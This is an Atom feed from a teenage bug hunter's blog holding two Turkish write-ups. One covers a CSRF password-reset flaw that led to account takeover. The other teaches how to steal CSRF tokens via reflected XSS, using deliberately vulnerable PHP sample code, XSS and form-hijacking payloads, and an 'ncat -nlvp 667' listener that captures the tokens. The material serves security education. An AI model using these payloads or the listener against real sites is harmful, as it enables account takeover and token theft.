@@ -1,0 +1,163 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-06-27T15:16:55+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Samet SAHIN</title><subtitle>16 y/o Bug Hunter | Web Application Security Researcher</subtitle><author><name>Samet SAHIN</name><email>sametsahin.xss@gmail.com</email></author><entry><title type="html">TR \| Full Account Takeover via Reset Password Function</title><link href="http://localhost:4000/posts/account-takeover-via-reset-password/" rel="alternate" type="text/html" title="TR \| Full Account Takeover via Reset Password Function" /><published>2018-06-12T00:00:00+00:00</published><updated>2018-06-12T00:00:00+00:00</updated><id>http://localhost:4000/posts/account-takeover-via-reset-password</id><content type="html" xml:base="http://localhost:4000/posts/account-takeover-via-reset-password/">&lt;p&gt;Merhaba arkadaşlar, ben Samet ŞAHİN.&lt;/p&gt;
+
+&lt;p&gt;Ünlü bir sitede açık ararken “Parolamı Yenile” kısmını gördüm. Öncelikle en kritik açıklardan biri olan SQL Injection’ı denedim fakat SQLi açığına rastlayamadım. Ardından parola yenileme, profil güncelleme gibi kısımlarda en çok rastlanan CSRF açığı aklıma geldi. Örnek bir parola yenileme isteği yaptım, ve karşılaştığım sonuç şu şekilde oldu;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/accounttakeover-1.png&quot; alt=&quot;CSRF Açıklı Parola Yenileme isteği&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Burada dikkatimi çeken şey ise herhangi bir Token ya da başka bir CSRF koruması olmamasıydı. Yani CSRF açığı düpedüz ortada. Basit bir şekilde istek gönderiliyordu ve JSON olarak bize yanıt veriliyordu. Aklıma nereden geldiğini bilmediğim bir şekilde oldPassword parametresini kaldırdım;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/accounttakeover-2.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ve “Success”, eski parolayı bilmeden bile parolayı keyfimce değiştirebileceğim bir açık ortaya çıkmış oldu. Açıkla ilgili hiç önlem alınmadığı için CSRF açığını daha da geliştirebileceğimi düşündüm ve Account Takeover ile ilgili izlediğim Proof Of Concept’ler ve Hackerone’da denk geldiğim raporlar aklıma geldi ve CSRF açığını Full Account Takeover’a dönüştürülebileceğini hatırladım;&lt;/p&gt;
+
+&lt;p&gt;Burp Suite -&amp;gt; Generate CSRF PoC ;
+&lt;img src=&quot;/images/accounttakeover-3.png&quot; alt=&quot;Account Takeover için kullanıcıya tıklattırılacak CSRF PoC&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Sonuç : Full Account Takeover :)&lt;/p&gt;
+
+&lt;p&gt;Teşekkürler.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Full and bad write-up is here :&lt;/em&gt; &lt;a href=&quot;https://medium.com/@sametsahinnet/full-account-takeover-via-reset-password-ca66ab5b0356&quot;&gt;Medium&lt;/a&gt;&lt;/p&gt;</content><author><name>Samet SAHIN</name><email>sametsahin.xss@gmail.com</email></author><category term="csrf" /><category term="hack" /><category term="bugbounty" /><category term="account takeover" /><category term="write-up" /><category term="poc" /><summary type="html">Full Account Takeover via Reset Password Function (CSRF)</summary></entry><entry><title type="html">TR \| Steal CSRF Tokens with simple XSS</title><link href="http://localhost:4000/posts/steal-csrf-tokens-with-simple-xss/" rel="alternate" type="text/html" title="TR \| Steal CSRF Tokens with simple XSS" /><published>2018-06-12T00:00:00+00:00</published><updated>2018-06-12T00:00:00+00:00</updated><id>http://localhost:4000/posts/steal-csrf-tokens-with-simple-xss</id><content type="html" xml:base="http://localhost:4000/posts/steal-csrf-tokens-with-simple-xss/">&lt;p&gt;Merhaba,
+Ben Samet ŞAHİN. İki yıldan biraz uzun süredir &lt;em&gt;Bug Bounty&lt;/em&gt; ile ve toplamda yaklaşık dört yıldır da &lt;em&gt;Web Uygulama Güvenliği&lt;/em&gt; alanında çalışmalar yürütmekteyim.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Bug Hunterlar&lt;/em&gt; olarak biz, Bug Bounty ile uğraşırken pek çok farklı sistem ve farklı güvenlik önlemleri görüyoruz. Bug Hunter olarak amacımız, güvenli (gözüken) sistemlerde (gerçek ve etkisi olan) açıklar bulup, onları şirketlere bildirmektir.&lt;/p&gt;
+
+&lt;p&gt;Yaptığımız testlerde bulduğumuz aynı tür açıklar her zaman aynı potansiyel zarara (impact) sahip olmayabiliyor.&lt;/p&gt;
+
+&lt;p&gt;Örneğin;
+Kurbana otomatik olarak çıkış yaptıran CSRF açığı (Bu genellikle açık kapsamına bile girmez.) ile kurbana otomatik olarak email ve parola değişikliği yaptıran CSRF (*1) açığı elbette aynı zararı veremez.&lt;/p&gt;
+
+&lt;p&gt;Şimdi, bu yazının konusuna gelelim. Elimizde iki adet XSS (Cross Site Scripting) açığı ve HTML kaynak kodundaki bir &lt;em&gt;input&lt;/em&gt; tagına yansımış CSRF tokenlerimiz (*2) var.&lt;/p&gt;
+
+&lt;h2 id=&quot;normal-xss-açığı-&quot;&gt;Normal XSS Açığı :&lt;/h2&gt;
+&lt;p&gt;Çirkin bir arama kutusu olduğunu, sitenin kaynak kodlarında CSRF Tokenlerin bulunduğunu ve &lt;em&gt;search&lt;/em&gt; input’unun değerini &lt;em&gt;GET&lt;/em&gt; isteğindeki &lt;em&gt;search&lt;/em&gt; parametresinden aldığını görüyoruz. (*3)&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; 
+&lt;span class=&quot;nv&quot;&gt;$benCSRFtoken&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;samet&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$printMD5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$benCSRFtoken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CSRFtoken&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;?php echo $printMD5 ?&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;search&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;?php echo $_GET['search']; ?&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Submit&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Elimizde şu an için hiçbir açık yok fakat görüyoruz ki &lt;em&gt;search&lt;/em&gt; parametresi hiçbir sanitizasyon (&lt;em&gt;4) işlemi yapılmamış. Bu durumda diyebiliriz ki buradan bir XSS açığı çıkabilir. (&lt;/em&gt;5) Açığımızı bulmamız için GET metoduyla search parametresine bir payload (*6) yazıyoruz ;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&amp;gt;&amp;lt;h1&amp;gt;xss&lt;/code&gt;  gönderdik ve kaynak kodunu inceledik :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Blog-1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Evet, başarılı bir şekilde valuenin tırnaklarını kapattık ve artık kendi HTML kodumuzu site üzerinde çalıştırabileceğimizi gördük. Şimdi XSS kanıtı için JavaScript kodunu çalıştırmamız gerekiyor. Bu seferki açık kodumuz ;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt; (*7) gönderdik ve kaynak kodunu inceledik :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Blog-2.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;XSS açığını kanıtlamış olduk. Bu normal bir XSS saldırısıydı ve HTML ve JavaScript kodu çalıştırmak dışında pek de bir şey yapamadık.&lt;/p&gt;
+
+&lt;h2 id=&quot;kritik-xss-açığı-&quot;&gt;Kritik XSS Açığı :&lt;/h2&gt;
+&lt;p&gt;Normal XSS açığında gördüğümüz sayfayla aynı işlemi yapmasına rağmen inputların sırasının farklı olduğu açıklı bir sayfa. İlk açıkta gönderdiğimiz açık kodlarının bu sitede de çalıştığını görebiliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; 
+&lt;span class=&quot;nv&quot;&gt;$benCSRFtoken&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;samet&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$printMD5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$benCSRFtoken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;search&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;?php echo $_GET['search']; ?&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;	
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CSRFtoken&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;?php echo $printMD5 ?&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Submit&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Trick zamanı :&lt;/strong&gt;&lt;br /&gt;
+Örneklerle de gördüğümüz gibi iki tane XSS ve input taglarına yansıtılmış CSRF tokenlerini gördük. Eğer &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;form&amp;gt;&lt;/code&gt; tagı ve CSRF tokeninin yansıtılmış olduğu input tagının arasında XSS açığına sahipseniz, CSRF tokenlerini de çalabilirsiniz. Bu gerçek ve daha önce pek çok kez karşılaştığım bir senaryo ama Sadece Kritik XSS açığında işe yarar. Neden mi ?&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Çünkü HTML dilinde değişken tanımlayıp sonra kullanma gibi bir ihtimaliniz yoktur. Yani yukarıda bir CSRF Tokenli input varsa ve siz aşağıdaki tagda kod çalıştırabiliyorsanız, o CSRF Tokenine XSS açığı ile erişemezsiniz. (*8)&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Yukarıda da değindiğim gibi &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;form&amp;gt;&lt;/code&gt; tagları arasında&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;/form&amp;gt;&lt;/code&gt; ve CSRF Token’in yansıtılmış olduğu &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;input&amp;gt;&lt;/code&gt; tagının üstünde olmanız gerekmektedir. Eğer bu ikisine de sahipseniz CSRF tokenlerini rahatlıkla çalabilirsiniz.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;O zaman exploit edelim :&lt;/strong&gt;&lt;br /&gt;
+Öncelikle XSS açığıyla CSRF tokenlerini çalabilmek için güzel bir payload yazmamız gerekiyor. Paylaodımızın  mantığı şu olmalı :&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Daha önce açılmış olan formu kapat : &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Yeni bir form aç ve action (&lt;em&gt;9) eventine dinlediğin ip ve port’u gir (&lt;/em&gt;10) : &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;form method=&quot;GET&quot; action=&quot;http://127.0.0.1:667/bla.html&quot;&amp;gt;&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Ncat ile seçili portu (667) dinle&lt;/li&gt;
+  &lt;li&gt;Kullanıcıyı butona tıklat ve loglardan CSRF Token’ini çek.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Exploit videosu burada :&lt;/p&gt;
+&lt;video width=&quot;500&quot; controls=&quot;&quot;&gt;
+  &lt;source src=&quot;/files/Blog-1.webm&quot; type=&quot;video/mp4&quot; /&gt;
+&lt;/video&gt;
+
+&lt;p&gt;&lt;strong&gt;SONUÇ :&lt;/strong&gt;&lt;br /&gt;
+Değerli içerik taşıyan input tagının ve açıklı input tagının sırası bile bir açığın zararını arttıracak kadar önemli olabiliyor. Bu yüzden manuel testler yapmanız ve bunun gibi trickleri deneyerek öğrenmeniz çok önemli. Deneyebilmeniz için Github’a XSS açıklı 2 dosyayı da koyuyorum. Kendi tricklerimi ve işinize yarayabilecek trickleri paylaştığım Twitter ve LinkedIn hesaplarımdan bana ulaşabilirsiniz.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/sametsahinnet/XSS-Blog-Post&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;strong&gt;*1&lt;/strong&gt; :
+Bu açık hakkında yazımı okuyabilirsiniz : https://sametsahin.net/posts/account-takeover-via-reset-password/&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;*2&lt;/strong&gt; :
+CSRF açığının oluşmasını engellemek için her istek veya kullanıcıya göre değişen uzun ve rastgele değerdir. Bu tokenlerin olmadığı durumlarda CSRF açığı meydana gelebilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;*3&lt;/strong&gt; :
+Bu kısım temel Web bilgisine dayandığı için Google’dan bulabilirsiniz.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;*4&lt;/strong&gt; :
+Sanitizasyon, diğer adıyla filtreleme işlemleri, kullanıcıdan direkt olarak alınan girdilerin, açıklara dönüşmesini engellemek için kullanılan güvenli kod yazma tekniğidir. Pek çok açık gerekli sanitizasyon işleminin yapılmaması veya yeterince kapsamlı olmamasından kaynaklanır.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;*5&lt;/strong&gt; :
+Elbette XSS çıkar bu doğru. Yanlış olan oradan sadece XSS çıkacağı düşüncesidir. Özellikle bu işlere yeni başladıysanız sadece bir açık bulmaya çalışırsınız. Yapmanız gereken bir açıktan en fazla ne kadar ileriye gidebileceğinizi denemektir. Herkes XSS bulabilir ama kolay kolay kimse XSS ile CSRF tokenlerinin de çalmayı denemez.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;*6&lt;/strong&gt; :
+Payload, açıkları bulmak ve sömürmek için hacker tarafından yazılan kodlardır. Payloadlara, açık kodları diyebiliriz. Ve payloadlar yeşil renkle ekrandan hızlıca akıp gitmez :)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;*7&lt;/strong&gt; :
+Normalde böyle bir payload çok az yerde işe çalışır. Payloadlarınızın kalitesini arttırmanız için elle yazmanızı ve her tuşun kaynak kodunda yansımış olduğu yerlere dikkatlice bakınız. Yani her deneyişinizde websitenin yanıtını kontrol ediniz.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;*8&lt;/strong&gt; :
+Hayır, erişebilirsiniz. Ama bunun ihtimali çok düşüktür. JavaScript kullanarak input içinde yer alan değerleri ekrana basabilirsiniz. Fakat bunun uzun ve içinde &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tagının kullanılmış olduğu bir payload yazmak zorundasınız. Ve ödül verecek kadar büyük tüm şirketler o &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tagını gördüğü anda sizi engeller. Bu yüzden bulsanız bulsanız küçük yerlerde bulursunuz ve o küçük yerler de küçük olduğu için CSRF token zaten kullanmamış olu ;)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;*9&lt;/strong&gt; :
+HTML’de form tagı açıldığı zaman bir de onu kapatmanız gerekir. Biz kapanmış form (&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;/form&amp;gt;&lt;/code&gt;) tagı enjekte ettiğimiz zaman görüntü şu şekilde olur :&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;search&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;query&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&quot;&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CSRFtoken&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2e47d7f81970b3bb09d249a7de385dbc&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Submit&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Enjekte ettiğimiz form tagı ile 1 tamamen kapatılmış ve bir de açılış tagı eksik olan &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;/form&amp;gt;&lt;/code&gt; tagımız olur. O zaman açılış tagımızı payloadımıza ekliyoruz ve son durumda iki adet form’umuz oluyor :&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;search&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;query&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+
+ve
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&amp;gt;&lt;/span&gt;&quot;&amp;gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hidden&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CSRFtoken&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2e47d7f81970b3bb09d249a7de385dbc&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Submit&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Baştan beri amacımız CSRF Tokeni içeren form’u kontrol edebilmekti. Action kısmını değiştirdiğimiz anda artık CSRF Tokeni içeren her istek bizim loglarımıza düşecek ve oradan okuyabileceğiz.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;*10&lt;/strong&gt; :
+CSRF Token’ine loglardan erişebilmemiz için logların bizde olması gerekir. Bu yüzden kendi local’imizde rastgele bir port’u dinliyoruz. Bu işlemi &lt;code class=&quot;highlighter-rouge&quot;&gt;ncat&lt;/code&gt; ile yapabilirsiniz :&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ncat -nlvp 667&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Değerli zamanınız için teşekkür ederim.&lt;br /&gt;
+Bol açıklar :)&lt;/p&gt;</content><author><name>Samet SAHIN</name><email>sametsahin.xss@gmail.com</email></author><category term="xss" /><category term="hack" /><category term="steal csrf tokens" /><category term="csrf bypass" /><category term="csrf" /><category term="bugbounty" /><category term="bug bounty" /><category term="write-up" /><category term="poc" /><category term="vulnerability" /><summary type="html">Steal CSRF Tokens with simple XSS</summary></entry></feed>
